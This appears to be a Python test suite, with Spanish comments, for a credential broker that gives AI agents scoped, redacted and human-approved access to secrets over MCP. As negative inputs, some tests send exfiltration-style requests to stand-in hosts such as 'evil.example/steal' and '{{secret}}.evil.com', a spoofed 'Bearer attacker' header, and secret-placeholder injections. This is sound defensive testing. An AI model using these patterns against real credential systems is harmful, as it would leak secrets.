import json

SECRET = "sk-live-0123456789abcdef"


def setup_http(admin, folder, echo, *, sensitive=False, mode="bearer", hosts=("127.0.0.1",), name="api", **meta):
    r = admin.post(
        "/api/credentials",
        json={
            "folder_id": folder["id"],
            "name": name,
            "type": "bearer_token" if mode == "bearer" else "api_key",
            "meta": {"allowed_hosts": list(hosts), "allow_http": True, "inject_mode": mode, **meta},
            "secret": {"secret": SECRET},
            "sensitive": sensitive,
        },
    )
    assert r.status_code == 201, r.text
    return r.json()


def new_agent(admin, grants):
    r = admin.post("/api/agents", json={"name": "bot", "grants": grants})
    assert r.status_code == 201, r.text
    return r.json()["token"]


def test_mcp_requires_valid_token(env, admin, folder):
    r = env.client.post("/mcp", json={})
    assert r.status_code == 401
    r = env.client.post("/mcp", headers={"Authorization": "Bearer llv_nope"}, json={})
    assert r.status_code == 401
    assert "www-authenticate" in r.headers


def test_revoked_agent_is_cut_off(env, admin, folder):
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    assert env.mcp(token, "list_credentials") is not None
    agent_id = admin.get("/api/agents").json()[0]["id"]
    admin.delete(f"/api/agents/{agent_id}")
    assert env.client.post("/mcp", headers={"Authorization": f"Bearer {token}"}, json={}).status_code == 401


def test_list_shows_only_granted_and_no_secrets(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server, name="granted")
    other = admin.post("/api/folders", json={"name": "otra"}).json()
    setup_http(admin, other, echo_server, name="hidden")
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    result = env.mcp(token, "list_credentials")
    items = result["result"] if isinstance(result, dict) else result
    assert [i["ref"] for i in items] == ["cred://infra/granted"]
    assert SECRET not in json.dumps(items)


def test_http_injects_auth_and_redacts_echo(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server)
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    out = env.mcp(
        token,
        "http_request",
        {"credential": "cred://infra/api", "method": "GET", "url": f"{echo_server}/v1/me", "query": {"a": "1"}},
    )
    assert out["status_code"] == 200
    assert SECRET not in json.dumps(out)  # el servidor eco devolvió el header Authorization
    echoed = json.loads(out["body"])
    assert echoed["headers"]["authorization"] == "Bearer [REDACTED]"
    assert echoed["path"] == "/v1/me?a=1"


def test_server_really_received_the_secret(env, admin, folder, echo_server):
    """Con inject_mode=header el servidor recibe el secreto en la cabecera elegida; al agente le llega redactado."""
    setup_http(admin, folder, echo_server, mode="header", header_name="X-Api-Key")
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    out = env.mcp(
        token,
        "http_request",
        {"credential": "cred://infra/api", "method": "POST", "url": f"{echo_server}/x", "body": "hola"},
    )
    assert json.loads(out["body"])["headers"]["x-api-key"] == "[REDACTED]"
    assert json.loads(out["body"])["body"] == "hola"


def test_placeholders_and_agent_cannot_override_auth(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server)
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    out = env.mcp(
        token,
        "http_request",
        {
            "credential": "cred://infra/api",
            "method": "POST",
            "url": f"{echo_server}/p",
            "headers": {"authorization": "Bearer attacker", "X-Custom": "tok={{secret}}"},
            "json_body": {"k": "{{secret}}"},
        },
    )
    echoed = json.loads(out["body"])
    assert echoed["headers"]["authorization"] == "Bearer [REDACTED]"  # ganó la inyectada
    assert "attacker" not in out["body"]
    assert echoed["headers"]["x-custom"] == "tok=[REDACTED]"
    assert json.loads(echoed["body"]) == {"k": "[REDACTED]"}


def test_unknown_placeholder_and_bad_host_rejected(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server)
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    base = {"credential": "cred://infra/api", "method": "GET"}
    err = env.mcp(token, "http_request", {**base, "url": f"{echo_server}/", "headers": {"X": "{{nope}}"}}, expect_error=True)
    assert "Placeholder desconocido" in err
    err = env.mcp(token, "http_request", {**base, "url": "http://evil.example/steal"}, expect_error=True)
    assert "Host no permitido" in err
    err = env.mcp(token, "http_request", {**base, "url": "http://user:pw@127.0.0.1/"}, expect_error=True)
    assert "credenciales" in err
    err = env.mcp(token, "http_request", {**base, "url": "http://{{secret}}.evil.com/"}, expect_error=True)
    assert "placeholders" in err or "Host" in err


def test_redirects_are_not_followed(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server)
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    out = env.mcp(token, "http_request", {"credential": "cred://infra/api", "method": "GET", "url": f"{echo_server}/redirect"})
    assert out["status_code"] == 302 and out["headers"]["location"] == "http://evil.example/steal"


def test_ssrf_blocked_to_loopback_even_if_host_is_allowed(strict_env, echo_server):
    e = strict_env
    admin = e.login()
    folder = admin.post("/api/folders", json={"name": "infra"}).json()
    setup_http(admin, folder, echo_server, allow_private_network=True)
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    err = e.mcp(
        token, "http_request", {"credential": "cred://infra/api", "method": "GET", "url": f"{echo_server}/"}, expect_error=True
    )
    assert "bloqueado" in err.lower()


def test_ungranted_and_wrong_type_credentials(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server)
    token = new_agent(admin, [])
    err = env.mcp(token, "http_request", {"credential": "cred://infra/api", "method": "GET", "url": f"{echo_server}/"}, expect_error=True)
    assert "no encontrada o sin acceso" in err
    token2 = new_agent(admin, [{"folder_id": folder["id"]}])
    err = env.mcp(token2, "ssh_exec", {"credential": "cred://infra/api", "command": "id"}, expect_error=True)
    assert "no sirve" in err


def test_sensitive_requires_single_use_bound_approval(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server, sensitive=True)
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    args = {"credential": "cred://infra/api", "method": "GET", "url": f"{echo_server}/secure"}

    first = env.mcp(token, "http_request", args)
    assert first["status"] == "approval_required"
    aid = first["approval_id"]

    err = env.mcp(token, "http_request", {**args, "approval_id": aid}, expect_error=True)
    assert "pendiente" in err

    assert admin.get("/api/approvals?status=pending").json()[0]["id"] == aid
    assert admin.post(f"/api/approvals/{aid}/decide", json={"approve": True}).status_code == 200
    assert env.mcp(token, "get_approval_status", {"approval_id": aid})["status"] == "approved"

    err = env.mcp(token, "http_request", {**args, "url": f"{echo_server}/otra-cosa", "approval_id": aid}, expect_error=True)
    assert "no corresponde" in err  # aprobada para otra URL

    ok = env.mcp(token, "http_request", {**args, "approval_id": aid})
    assert ok["status_code"] == 200

    err = env.mcp(token, "http_request", {**args, "approval_id": aid}, expect_error=True)
    assert "ya fue utilizada" in err  # un solo uso


def test_denied_approval_and_foreign_approval(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server, sensitive=True)
    t1 = new_agent(admin, [{"folder_id": folder["id"]}])
    t2 = new_agent(admin, [{"folder_id": folder["id"]}])
    args = {"credential": "cred://infra/api", "method": "GET", "url": f"{echo_server}/s"}
    aid = env.mcp(t1, "http_request", args)["approval_id"]
    admin.post(f"/api/approvals/{aid}/decide", json={"approve": False})
    assert "rechazada" in env.mcp(t1, "http_request", {**args, "approval_id": aid}, expect_error=True)
    assert "no encontrada" in env.mcp(t2, "get_approval_status", {"approval_id": aid}, expect_error=True).lower()


def test_audit_trail_has_agent_activity_without_secrets(env, admin, folder, echo_server):
    setup_http(admin, folder, echo_server)
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    env.mcp(token, "http_request", {"credential": "cred://infra/api", "method": "GET", "url": f"{echo_server}/a?token={{{{secret}}}}"})
    env.mcp(token, "http_request", {"credential": "cred://infra/api", "method": "GET", "url": "http://evil.example/"}, expect_error=True)
    entries = admin.get("/api/audit").json()
    pairs = {(e["actor_type"], e["action"], e["outcome"]) for e in entries}
    assert ("agent", "http_request", "ok") in pairs and ("agent", "http_request", "denied") in pairs
    dump = json.dumps(entries)
    assert SECRET not in dump
    assert "{{secret}}" in dump  # se audita el placeholder, no el valor sustituido
    assert admin.get("/api/audit/verify").json()["ok"] is True


def test_rate_limit(env, admin, folder, echo_server):
    env.rt.settings.agent_rate_limit_per_minute = 3
    from llaverito.security import RateLimiter

    env.app.state.broker.limiter = RateLimiter(3)
    setup_http(admin, folder, echo_server)
    token = new_agent(admin, [{"folder_id": folder["id"]}])
    args = {"credential": "cred://infra/api", "method": "GET", "url": f"{echo_server}/"}
    for _ in range(3):
        env.mcp(token, "http_request", args)
    assert "Límite" in env.mcp(token, "http_request", args, expect_error=True)

